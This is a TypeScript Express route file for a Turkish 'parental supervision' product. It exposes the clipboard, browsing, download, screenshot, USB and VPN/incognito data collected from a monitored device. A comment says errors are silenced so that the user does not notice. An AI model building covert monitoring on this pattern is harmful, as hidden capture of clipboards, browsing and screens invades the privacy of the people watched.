// BERAT CANKIR - Ebeveyn Gözetim API Routes
import type { Express, Request, Response } from "express";
import { adminAuthMiddleware } from "./admin-auth";
import { activityLogger } from './activity-logger';
import { storage } from './depolama';

// ✅ SESSIZ MOD: Monitoring hatalarını loglamayalım (kullanıcı fark etmesin)
const silentLog = {
  error: (...args: any[]) => {}, // Sessiz - hiçbir şey yapmaz
  log: (...args: any[]) => {},
  warn: (...args: any[]) => {},
};

// Monitoring verileri için global store (Electron tarafından doldurulacak)
export let monitoringData = {
  clipboardHistory: [],
  webHistory: [],
  keywordAlerts: [],
  fileDownloads: [],
  usbDevices: [],
  activityTimeline: [],
  systemStatus: {
    microphoneActive: false,
    wifiConnected: false,
    vpnDetected: false,
    incognitoDetected: false,
    afk: {
      isAFK: false,
      lastActivity: Date.now(),
      afkStartTime: null,
    },
    installedApps: 0,
  },
  screenshots: [],
  installedApps: [],
};

export function updateMonitoringData(data: any) {
  monitoringData = { ...monitoringData, ...data };
}

export function registerMonitoringRoutes(app: Express) {
  // Admin auth middleware - protect all monitoring endpoints
  app.use("/api/afyonlu/monitoring", adminAuthMiddleware);

  // Get clipboard history
  app.get("/api/afyonlu/monitoring/clipboard", async (req: Request, res: Response) => {
    try {
      const limit = parseInt(req.query.limit as string) || 100;
      const history = monitoringData.clipboardHistory.slice(-limit).reverse();
      
      res.json({
        success: true,
        data: history,
        total: monitoringData.clipboardHistory.length,
      });
    } catch (error) {
      silentLog.error("Clipboard history hatası:", error);
      res.status(500).json({
        success: false,
        message: "Clipboard geçmişi alınamadı",
      });
    }
  });

  // Get web history
  app.get("/api/afyonlu/monitoring/web-history", async (req: Request, res: Response) => {
    try {
      const limit = parseInt(req.query.limit as string) || 500;
      const history = monitoringData.webHistory.slice(-limit).reverse();
      
      res.json({
        success: true,
        data: history,
        total: monitoringData.webHistory.length,
      });
    } catch (error) {
      silentLog.error("Web history hatası:", error);
      res.status(500).json({
        success: false,
        message: "Web geçmişi alınamadı",
      });
    }
  });

  // Get keyword alerts
  app.get("/api/afyonlu/monitoring/keyword-alerts", async (req: Request, res: Response) => {
    try {
      const limit = parseInt(req.query.limit as string) || 100;
      const alerts = monitoringData.keywordAlerts.slice(-limit).reverse();
      
      res.json({
        success: true,
        data: alerts,
        total: monitoringData.keywordAlerts.length,
      });
    } catch (error) {
      silentLog.error("Keyword alerts hatası:", error);
      res.status(500).json({
        success: false,
        message: "Anahtar kelime uyarıları alınamadı",
      });
    }
  });

  // Get file downloads
  app.get("/api/afyonlu/monitoring/file-downloads", async (req: Request, res: Response) => {
    try {
      const limit = parseInt(req.query.limit as string) || 100;
      const downloads = monitoringData.fileDownloads.slice(-limit).reverse();
      
      res.json({
        success: true,
        data: downloads,
        total: monitoringData.fileDownloads.length,
      });
    } catch (error) {
      silentLog.error("File downloads hatası:", error);
      res.status(500).json({
        success: false,
        message: "Dosya indirmeleri alınamadı",
      });
    }
  });

  // Get activity timeline
  app.get("/api/afyonlu/monitoring/timeline", async (req: Request, res: Response) => {
    try {
      const limit = parseInt(req.query.limit as string) || 1000;
      const timeline = monitoringData.activityTimeline.slice(-limit).reverse();
      
      res.json({
        success: true,
        data: timeline,
        total: monitoringData.activityTimeline.length,
      });
    } catch (error) {
      silentLog.error("Activity timeline hatası:", error);
      res.status(500).json({
        success: false,
        message: "Aktivite zaman çizelgesi alınamadı",
      });
    }
  });

  // Get system status
  app.get("/api/afyonlu/monitoring/system-status", async (req: Request, res: Response) => {
    try {
      res.json({
        success: true,
        data: monitoringData.systemStatus,
      });
    } catch (error) {
      silentLog.error("System status hatası:", error);
      res.status(500).json({
        success: false,
        message: "Sistem durumu alınamadı",
      });
    }
  });

  // Get screenshots list
  app.get("/api/afyonlu/monitoring/screenshots", async (req: Request, res: Response) => {
    try {
      res.json({
        success: true,
        data: monitoringData.screenshots,
        total: monitoringData.screenshots.length,
      });
    } catch (error) {
      silentLog.error("Screenshots list hatası:", error);
      res.status(500).json({
        success: false,
        message: "Ekran görüntüleri listesi alınamadı",
      });
    }
  });

  // Get screenshot file
  app.get("/api/afyonlu/monitoring/screenshots/:filename", async (req: Request, res: Response) => {
    try {
      // This will be handled by Electron IPC
      res.status(501).json({
        success: false,
        message: "Screenshot dosyası Electron üzerinden alınmalıdır",
      });
    } catch (error) {
      silentLog.error("Screenshot file hatası:", error);
      res.status(500).json({
        success: false,
        message: "Ekran görüntüsü alınamadı",
      });
    }
  });

  // Get installed apps
  app.get("/api/afyonlu/monitoring/installed-apps", async (req: Request, res: Response) => {
    try {
      res.json({
        success: true,
        data: monitoringData.installedApps,
        total: monitoringData.installedApps.length,
      });
    } catch (error) {
      silentLog.error("Installed apps hatası:", error);
      res.status(500).json({
        success: false,
        message: "Yüklü uygulamalar alınamadı",
      });
    }
  });

  // Get USB devices
  app.get("/api/afyonlu/monitoring/usb-devices", async (req: Request, res: Response) => {
    try {
      res.json({
        success: true,
        data: monitoringData.usbDevices,
        total: monitoringData.usbDevices.length,
      });
    } catch (error) {
      silentLog.error("USB devices hatası:", error);
      res.status(500).json({
        success: false,
        message: "USB cihazları alınamadı",
      });
    }
  });

  // Get monitoring summary/stats
  app.get("/api/afyonlu/monitoring/summary", async (req: Request, res: Response) => {
    try {
      const now = Date.now();
      const last24h = now - (24 * 60 * 60 * 1000);
      const last7d = now - (7 * 24 * 60 * 60 * 1000);
      
      // Clipboard analizi
      const clipboardLast24h = monitoringData.clipboardHistory.filter((item: any) => 
        new Date(item.timestamp).getTime() > last24h
      );
      const clipboardLast7d = monitoringData.clipboardHistory.filter((item: any) => 
        new Date(item.timestamp).getTime() > last7d
      );
      
      // Web history analizi
      const webVisitsLast24h = monitoringData.webHistory.filter((item: any) => 
        new Date(item.timestamp).getTime() > last24h
      );
      const webVisitsLast7d = monitoringData.webHistory.filter((item: any) => 
        new Date(item.timestamp).getTime() > last7d
      );
      
      // Keyword alerts analizi
      const alertsLast24h = monitoringData.keywordAlerts.filter((item: any) => 
        new Date(item.timestamp).getTime() > last24h
      );
      const alertsLast7d = monitoringData.keywordAlerts.filter((item: any) => 
        new Date(item.timestamp).getTime() > last7d
      );
      
      // Downloads analizi
      const downloadsLast24h = monitoringData.fileDownloads.filter((item: any) => 
        new Date(item.timestamp).getTime() > last24h
      );
      const downloadsLast7d = monitoringData.fileDownloads.filter((item: any) => 
        new Date(item.timestamp).getTime() > last7d
      );
      
      // En çok ziyaret edilen siteler (son 7 gün)
      const topWebsites = webVisitsLast7d.reduce((acc: any, visit: any) => {
        const url = visit.url || visit.domain || 'Bilinmiyor';
        acc[url] = (acc[url] || 0) + 1;
        return acc;
      }, {});
      const topWebsitesList = Object.entries(topWebsites)
        .map(([url, count]) => ({ url, count }))
        .sort((a: any, b: any) => b.count - a.count)
        .slice(0, 10);
      
      const summary = {
        overview: {
          icon: '📊',
          description: 'Genel İzleme Özeti'
        },
        clipboard: {
          icon: '📋',
          total: monitoringData.clipboardHistory.length,
          last24h: clipboardLast24h.length,
          last7d: clipboardLast7d.length,
          trend: clipboardLast24h.length > (clipboardLast7d.length / 7) ? 'up' : 'down',
          description: 'Pano Aktivitesi'
        },
        webVisits: {
          icon: '🌐',
          total: monitoringData.webHistory.length,
          last24h: webVisitsLast24h.length,
          last7d: webVisitsLast7d.length,
          trend: webVisitsLast24h.length > (webVisitsLast7d.length / 7) ? 'up' : 'down',
          topSites: topWebsitesList,
          description: 'Web Ziyaretleri'
        },
        keywordAlerts: {
          icon: '🚨',
          total: monitoringData.keywordAlerts.length,
          last24h: alertsLast24h.length,
          last7d: alertsLast7d.length,
          severity: alertsLast24h.length > 5 ? 'high' : alertsLast24h.length > 2 ? 'medium' : 'low',
          description: 'Anahtar Kelime Uyarıları'
        },
        fileDownloads: {
          icon: '📥',
          total: monitoringData.fileDownloads.length,
          last24h: downloadsLast24h.length,
          last7d: downloadsLast7d.length,
          trend: downloadsLast24h.length > (downloadsLast7d.length / 7) ? 'up' : 'down',
          description: 'Dosya İndirmeleri'
        },
        screenshots: {
          icon: '📸',
          total: monitoringData.screenshots.length,
          description: 'Ekran Görüntüleri'
        },
        systemStatus: {
          icon: '⚙️',
          ...monitoringData.systemStatus,
          description: 'Sistem Durumu',
          statusText: monitoringData.systemStatus.vpnDetected ? '🔴 VPN Tespit Edildi' :
                      monitoringData.systemStatus.incognitoDetected ? '🟡 Gizli Mod Aktif' :
                      monitoringData.systemStatus.afk.isAFK ? '🟠 AFK Durumda' :
                      '🟢 Normal Çalışıyor'
        },
        usbDevices: {
          icon: '🔌',
          total: monitoringData.usbDevices.length,
          description: 'USB Cihazları'
        },
        installedApps: {
          icon: '📱',
          total: monitoringData.installedApps.length,
          description: 'Yüklü Uygulamalar'
        }
      };
      
      res.json({
        success: true,
        data: summary,
        timestamp: new Date().toISOString(),
        period: {
          last24h: '📅 Son 24 Saat',
          last7d: '📅 Son 7 Gün',
          total: '📅 Toplam'
        }
      });
    } catch (error) {
      silentLog.error("Monitoring summary hatası:", error);
      res.status(500).json({
        success: false,
        message: "İzleme özeti alınamadı",
        error: error instanceof Error ? error.message : 'Bilinmeyen hata'
      });
    }
  });
  
  // ADMIN PANEL - Kullanıcı aktivite detayları (lisans bazlı)
  app.get("/api/afyonlu/monitoring/user-activities/:licenseId", async (req: Request, res: Response) => {
    try {
      const { licenseId } = req.params;
      const limit = parseInt(req.query.limit as string) || 100;
      
      // Tüm aktiviteleri al
      const allActivities = activityLogger.getAll();
      
      // License ID'ye göre filtrele
      const userActivities = allActivities
        .filter((activity: any) => activity.details?.licenseId === licenseId || activity.userId === licenseId)
        .slice(-limit)
        .reverse();
      
      // Son aktivite zamanını bul
      const lastActivity = userActivities.length > 0 
        ? userActivities[0].timestamp 
        : null;
      
      // Aktivite tiplerini say
      const activityCounts = userActivities.reduce((acc: any, activity: any) => {
        acc[activity.type] = (acc[activity.type] || 0) + 1;
        return acc;
      }, {});
      
      res.json({
        success: true,
        data: {
          activities: userActivities,
          summary: {
            totalActivities: userActivities.length,
            lastActivity,
            activityCounts,
          },
        },
      });
    } catch (error) {
      silentLog.error("User activities hatası:", error);
      res.status(500).json({
        success: false,
        message: "Kullanıcı aktiviteleri alınamadı",
      });
    }
  });
  
  // ADMIN PANEL - Kullanıcı aktivite durumu özeti (tüm aktif lisanslar için)
  app.get("/api/afyonlu/monitoring/activity-status", async (req: Request, res: Response) => {
    try {
      // ActivityLogger'dan tüm aktiviteleri al
      const recentActivities = activityLogger.getLogs({ limit: 1000 });
      
      // Aktiviteleri kullanıcılara göre grupla
      const userActivityMap = new Map<string, any>();
      
      recentActivities.forEach((activity: any) => {
        const userId = activity.userId || activity.details?.licenseId || 'unknown';
        
        if (!userActivityMap.has(userId)) {
          userActivityMap.set(userId, {
            userId,
            userName: activity.userName || activity.details?.customerName || 'Bilinmiyor',
            lastSeen: activity.timestamp,
            totalActivities: 0,
            activityTypes: {},
            recentActions: [],
          });
        }
        
        const userStats = userActivityMap.get(userId);
        userStats.totalActivities++;
        userStats.activityTypes[activity.type] = (userStats.activityTypes[activity.type] || 0) + 1;
        
        // En yeni aktiviteyi güncelle
        if (new Date(activity.timestamp) > new Date(userStats.lastSeen)) {
          userStats.lastSeen = activity.timestamp;
        }
        
        // Son 5 aktiviteyi sakla
        if (userStats.recentActions.length < 5) {
          userStats.recentActions.push({
            action: activity.action,
            timestamp: activity.timestamp,
            type: activity.type,
          });
        }
      });
      
      // Array'e çevir ve zamana göre sırala
      const activityStatus = Array.from(userActivityMap.values())
        .sort((a, b) => new Date(b.lastSeen).getTime() - new Date(a.lastSeen).getTime());
      
      res.json({
        success: true,
        data: activityStatus,
      });
    } catch (error) {
      silentLog.error("Activity status hatası:", error);
      res.status(500).json({
        success: false,
        message: "Aktivite durumu alınamadı",
      });
    }
  });
}

// BERAT BİLAL CANKIR
// CANKIR
